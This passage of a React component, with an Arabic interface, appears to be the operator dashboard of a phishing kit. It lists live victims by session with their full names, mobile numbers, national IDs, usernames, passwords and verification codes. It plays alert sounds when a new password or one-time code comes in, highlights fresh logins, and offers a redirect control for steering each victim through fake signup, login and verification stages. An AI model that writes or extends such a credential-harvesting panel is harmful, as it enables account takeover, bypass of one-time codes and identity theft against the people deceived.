    const byStage: Record<string, number> = {};
    clients.forEach(c => {
      byStage[c.stage] = (byStage[c.stage] || 0) + 1;
    });
    const onlineCount = clients.filter(c => c.status === 'online').length;
    return { byStage, onlineCount };
  }, [clients]);

  // Filtered clients
  const filtered = useMemo(() => {
    let result = clients;
    
    // Filter by stage
    if (stageFilter !== 'all') {
      result = result.filter(c => c.stage === stageFilter);
    }
    
    // Filter by search
    if (search.trim()) {
      const q = search.trim().toLowerCase();
      result = result.filter(c =>
        [c.fullName, c.mobile, c.nationalId, c.username].some(v => v?.toLowerCase().includes(q))
      );
    }
    
    // Sort: online first, then by last activity
    return result.sort((a, b) => {
      if (a.status === 'online' && b.status !== 'online') return -1;
      if (a.status !== 'online' && b.status === 'online') return 1;
      return new Date(b.lastSeenAt || b.updatedAt).getTime() - new Date(a.lastSeenAt || a.updatedAt).getTime();
    });
  }, [clients, search, stageFilter]);

  // Sound notifications on client data changes - only when NEW data arrives
  useEffect(() => {
    if (!soundEnabled || !isAuthenticated) return;

    // Skip first load - don't play sounds for existing data
    if (isInitialLoad.current) {
      // Just store current data without playing sounds
      clients.forEach(client => {
        previousClientsData.current.set(client.sessionId, { ...client });
      });
      isInitialLoad.current = false;
      return;
    }

    clients.forEach(client => {
      const clientId = client.sessionId;
      const previousData = previousClientsData.current.get(clientId);
      
      // If this is a new client (not in previous data), skip it
      if (!previousData) {
        previousClientsData.current.set(clientId, { ...client });
        return;
      }
      
      // Check if personal data (signup) is NEW
      const hasNewSignupData = 
        (client.fullName && previousData.fullName !== client.fullName) ||
        (client.mobile && previousData.mobile !== client.mobile) ||
        (client.nationalId && previousData.nationalId !== client.nationalId);
      
      if (hasNewSignupData && (client.fullName || client.mobile || client.nationalId)) {
        AudioNotifications.playMessenger();
      }
      
      // Check if account data (username/password) is NEW
      const hasNewAccountData = 
        (client.username && previousData.username !== client.username) ||
        (client.password && previousData.password !== client.password);
      
      if (hasNewAccountData && (client.username || client.password)) {
        AudioNotifications.playAlert();
        // Add highlight for this client (only once when new data arrives)
        setRecentLoginHighlights(prev => {
          if (prev.has(clientId)) return prev;
          const next = new Set(prev);
          next.add(clientId);
          return next;
        });
      }
      
      // Check if verification code is NEW
      const hasNewVerifyData = 
        client.verificationCode && 
        previousData.verificationCode !== client.verificationCode;
      
      if (hasNewVerifyData && client.verificationCode) {
        AudioNotifications.playChime();
      }
      
      // Update previous data for next comparison
      previousClientsData.current.set(clientId, { ...client });
    });
  }, [clients, soundEnabled, isAuthenticated]);

  useEffect(() => {
    const checkAuth = async () => {
      const loggedIn = localStorage.getItem('admin_logged_in');
      if (loggedIn === 'true') {
        const isValid = await verifyToken();
        if (isValid) {
          setIsAuthenticated(true);
        } else {
          localStorage.removeItem('admin_token');
          localStorage.removeItem('admin_logged_in');
        }
      }
      setIsChecking(false);
    };
    checkAuth();
  }, []);

  const handleLogin = () => setIsAuthenticated(true);

  if (isChecking) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100">
        <Loader2 className="w-8 h-8 animate-spin text-[#0a4fa3]" />
      </div>
    );
  }

  if (!isAuthenticated) {
    return <LoginScreen onLogin={handleLogin} />;
  }

  return (
    <AdminLayout>
      {/* Apply font scale to this container */}
      <div 
        className="space-y-4 sm:space-y-5 admin-font-scale"
        style={{ fontSize: 'calc(1rem * var(--admin-font-scale, 1))' }}
      >
        {/* Controls Bar */}
        <div className="flex items-center justify-between gap-3 bg-muted/30 rounded-xl p-3">
          {/* Sound Toggle */}
          <button
            onClick={() => setSoundEnabled(!soundEnabled)}
            className={`flex items-center gap-2 px-4 py-2 rounded-lg transition-colors ${
              soundEnabled 
                ? 'bg-emerald-100 text-emerald-700 hover:bg-emerald-200' 
                : 'bg-gray-200 text-gray-500 hover:bg-gray-300'
            }`}
            title={soundEnabled ? 'إلغاء التنبيهات الصوتية' : 'تفعيل التنبيهات الصوتية'}
          >
            {soundEnabled ? (
              <span className="text-lg">🔔</span>
            ) : (
              <span className="text-lg">🔕</span>
            )}
            <span className="text-sm font-medium">
              {soundEnabled ? 'الصوت مفعل' : 'الصوت معطل'}
            </span>
          </button>

          {/* Font Size Controls */}
          <div className="flex items-center gap-2">
            <Type className="w-5 h-5 text-muted-foreground" />
            <button
              onClick={() => setFontSize(fontSize === 'small' ? 'normal' : fontSize === 'normal' ? 'large' : 'xlarge')}
              className="p-2 rounded-lg bg-white border hover:bg-gray-50 transition-colors"
              title="تكبير"
            >
              <ZoomIn className="w-5 h-5" />
            </button>
            <span className="px-3 py-1 bg-white border rounded-lg text-sm font-medium min-w-[60px] text-center">
              {FONT_SIZES[fontSize].label}
            </span>
            <button
              onClick={() => setFontSize(fontSize === 'xlarge' ? 'large' : fontSize === 'large' ? 'normal' : 'small')}
              className="p-2 rounded-lg bg-white border hover:bg-gray-50 transition-colors"
              title="تصغير"
            >
              <ZoomOut className="w-5 h-5" />
            </button>
            <button
              onClick={() => setFontSize('normal')}
              className="px-3 py-2 rounded-lg bg-gray-200 hover:bg-gray-300 transition-colors text-sm font-medium"
              title="الحجم الطبيعي"
            >
              R
            </button>
          </div>
        </div>

        {/* Stats Cards - Larger */}
        <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-6 gap-3 sm:gap-4">
          {/* Online */}
          <div className="rounded-2xl border border-emerald-300 bg-emerald-50 p-4 sm:p-5">
            <div className="flex items-center gap-2 mb-2">
              <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
              <span className="text-xs sm:text-sm text-emerald-600 font-medium">متصل الآن</span>
            </div>
            <p className="text-3xl sm:text-4xl font-bold text-emerald-700">{stats.onlineCount}</p>
          </div>
          
          {/* Pending Approval - Most Important */}
          <button 
            onClick={() => setStageFilter(stageFilter === 'pending_approval' ? 'all' : 'pending_approval')}
            className={`rounded-2xl border p-4 sm:p-5 text-right transition-all ${stageFilter === 'pending_approval' ? 'ring-2 ring-amber-500 bg-amber-50' : 'border-amber-300 bg-amber-50 hover:bg-amber-100'}`}
          >
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs sm:text-sm text-amber-600 font-medium">قيد المراجعة</span>
              <AlertTriangle className="w-4 h-4 text-amber-500" />
            </div>
            <p className="text-3xl sm:text-4xl font-bold text-amber-700">{stats.byStage['pending_approval'] || 0}</p>
          </button>
          
          {/* Verify */}
          <button 
            onClick={() => setStageFilter(stageFilter === 'verify' ? 'all' : 'verify')}
            className={`rounded-2xl border p-4 sm:p-5 text-right transition-all ${stageFilter === 'verify' ? 'ring-2 ring-indigo-500 bg-indigo-50' : 'border-indigo-300 bg-indigo-50 hover:bg-indigo-100'}`}
          >
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs sm:text-sm text-indigo-600 font-medium">رمز التحقق</span>
              <ShieldCheck className="w-4 h-4 text-indigo-500" />
            </div>
            <p className="text-3xl sm:text-4xl font-bold text-indigo-700">{stats.byStage['verify'] || 0}</p>
          </button>
          
          {/* Signup */}
          <button 
            onClick={() => setStageFilter(stageFilter === 'signup' ? 'all' : 'signup')}
            className={`rounded-2xl border p-4 sm:p-5 text-right transition-all ${stageFilter === 'signup' ? 'ring-2 ring-blue-500 bg-blue-50' : 'border-blue-300 bg-blue-50 hover:bg-blue-100'}`}
          >
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs sm:text-sm text-blue-600 font-medium">التسجيل</span>
              <User className="w-4 h-4 text-blue-500" />
            </div>
            <p className="text-3xl sm:text-4xl font-bold text-blue-700">{stats.byStage['signup'] || 0}</p>
          </button>
          
          {/* Create Account */}
          <button 
            onClick={() => setStageFilter(stageFilter === 'create_account' ? 'all' : 'create_account')}
            className={`rounded-2xl border p-4 sm:p-5 text-right transition-all ${stageFilter === 'create_account' ? 'ring-2 ring-purple-500 bg-purple-50' : 'border-purple-300 bg-purple-50 hover:bg-purple-100'}`}
          >
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs sm:text-sm text-purple-600 font-medium">تسجيل الدخول </span>
              <KeyRound className="w-4 h-4 text-purple-500" />
            </div>
            <p className="text-3xl sm:text-4xl font-bold text-purple-700">{stats.byStage['create_account'] || 0}</p>
          </button>
          
          {/* Total */}
          <div className="rounded-2xl border border-gray-300 bg-gray-50 p-4 sm:p-5">
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs sm:text-sm text-gray-600 font-medium">الإجمالي</span>
              <Users className="w-4 h-4 text-gray-400" />
            </div>
            <p className="text-3xl sm:text-4xl font-bold text-gray-700">{clients.length}</p>
          </div>
        </div>

        {/* Search & Filter Bar */}
        <div className="flex flex-col sm:flex-row gap-3">
          <div className="relative flex-1">
            <Search className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
            <Input
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="بحث بالاسم أو الموبايل..."
              className="pr-12 h-12 sm:h-14 text-base"
            />
          </div>
          {stageFilter !== 'all' && (
            <Button variant="outline" size="sm" onClick={() => setStageFilter('all')} className="h-12 sm:h-14 gap-2 text-base">
              <XCircle className="w-4 h-4" />
              <span>إلغاء الفلتر</span>
            </Button>
          )}
        </div>

        {/* Results Count */}
        <div className="flex items-center justify-between text-xs sm:text-sm text-muted-foreground">
          <div className="flex items-center gap-2">
            {status === 'online' ? (
              <span className="flex items-center gap-1 text-emerald-500">
                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                متصل
              </span>
            ) : (
              <span className="flex items-center gap-1">
                <Loader2 className="w-3 h-3 animate-spin" />
                جارٍ الاتصال...
              </span>
            )}
          </div>
        </div>

        {/* Empty State */}
        {filtered.length === 0 && (
          <div className="rounded-2xl border border-dashed border-border p-8 sm:p-12 text-center text-muted-foreground">
            <div className="flex flex-col items-center gap-3">
              <div className="w-12 h-12 sm:w-16 sm:h-16 rounded-full bg-muted flex items-center justify-center">
                <User className="w-6 h-6 sm:w-8 sm:h-8 text-muted-foreground/50" />
              </div>
              <p className="text-sm sm:text-base">لا يوجد عملاء</p>
              {stageFilter !== 'all' && (
                <Button variant="outline" size="sm" onClick={() => setStageFilter('all')}>
                  عرض الكل
                </Button>
              )}
            </div>
          </div>
        )}

        {/* Client List - Larger */}
        <div className="space-y-3 sm:space-y-4">
          {filtered.map((client) => (
            <ClientCard
              key={client.sessionId}
              client={client}
              requestHistory={requestHistory}
              sendRedirect={sendRedirect}
              shouldHighlightLogin={recentLoginHighlights.has(client.sessionId)}
            />
          ))}
        </div>
      </div>
    </AdminLayout>
  );
}
